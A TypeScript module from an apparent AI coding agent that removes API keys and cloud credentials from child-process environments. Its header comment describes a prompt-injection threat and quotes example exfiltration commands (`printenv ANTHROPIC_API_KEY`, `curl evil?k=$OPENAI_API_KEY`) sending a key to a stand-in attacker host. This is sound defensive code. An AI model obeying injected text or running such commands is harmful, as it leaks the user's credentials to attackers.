// Secrets stripped from CHILD process environments (bash, hooks, MCP stdio).
//
// Threat: a prompt-injected model (via file/MCP/web content) runs e.g.
// `printenv ANTHROPIC_API_KEY` or `curl evil?k=$OPENAI_API_KEY` and exfiltrates
// a credential into the transcript → the LLM provider → an attacker. The parent
// c-agent process keeps these (the provider SDK reads them); child processes
// never need them, so we remove them before every spawn. Mirrors Claude Code's
// subprocessEnv(). Disable with C_AGENT_NO_ENV_SCRUB=1.
//
// Named-list only (no broad `*_TOKEN` glob): a blanket strip would break legit
// tooling like `gh`/`git` that need GITHUB_TOKEN — the same call Claude Code makes.
const SCRUB = [
  // Anthropic / OpenAI provider auth
  "ANTHROPIC_API_KEY",
  "ANTHROPIC_AUTH_TOKEN",
  "CLAUDE_CODE_OAUTH_TOKEN",
  "OPENAI_API_KEY",
  // Cloud provider creds (lazy SDK reads in parent only)
  "AWS_ACCESS_KEY_ID",
  "AWS_SECRET_ACCESS_KEY",
  "AWS_SESSION_TOKEN",
  "AZURE_CLIENT_SECRET",
  "GOOGLE_APPLICATION_CREDENTIALS",
  // Telemetry exporter headers (documented to carry Bearer tokens)
  "OTEL_EXPORTER_OTLP_HEADERS",
];

// Extra var names registered at startup — e.g. provider `apiKeyEnv` from
// settings.json, which name custom env vars that hold API keys.
let extraScrub: string[] = [];

/** Register additional env var names to scrub (called once at startup). */
export function registerScrubVars(names: Array<string | undefined>): void {
  extraScrub = names.filter((n): n is string => !!n);
}

/** A copy of process.env with provider/cloud secrets removed, for child spawns. */
export function subprocessEnv(): NodeJS.ProcessEnv {
  if (process.env.C_AGENT_NO_ENV_SCRUB) return process.env;
  const env = { ...process.env };
  for (const k of SCRUB) delete env[k];
  for (const k of extraScrub) delete env[k];
  return env;
}
